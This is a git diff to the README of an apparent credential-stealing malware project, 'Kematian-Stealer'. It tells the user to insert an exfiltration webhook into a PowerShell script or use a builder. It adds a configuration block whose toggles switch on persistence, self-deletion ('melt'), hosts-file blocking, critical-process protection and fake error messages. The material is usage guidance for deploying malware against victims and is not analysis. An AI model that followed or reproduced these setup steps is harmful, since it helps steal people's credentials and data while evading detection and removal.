@@ -37,9 +37,21 @@ Moreover, the tool has robust `persistence mechanisms` to remain active on the m
 - Copy the `Webhook URL`
 - Download [main.ps1](https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/main.ps1) 
 - Open `main.ps1` and replace `YOUR_WEBHOOK_HERE` in line `30` with your webhook or use the [builder](https://github.com/ChildrenOfYahweh/Kematian-Stealer/releases/tag/Builder).
-- Additionally, set `$true` for the variables you wish to activate. Conversely, utilize `$false` to deactivate them, as shown in the image below.
+- Additionally, set `$true` for the variables you wish to activate. Conversely, utilize `$false` to deactivate them, as shown in `configurations` below.
+ 
+ > [!NOTE]   
+ > **The debug option is for testing purposes only**
 
-![image](https://github.com/Chainski/Kematian-Stealer/assets/96607632/18b81167-adfc-47e6-84da-35c1d0aa1357)
+### Configurations
+```ps1
+$debug = $false
+$autoupdate = $false
+$blockhostsfile = $true
+$criticalprocess = $false
+$melt = $true
+$fakeerror = $false
+$persistence = $true
+```
 
 # Requirements
 - To build Kematian, you need:
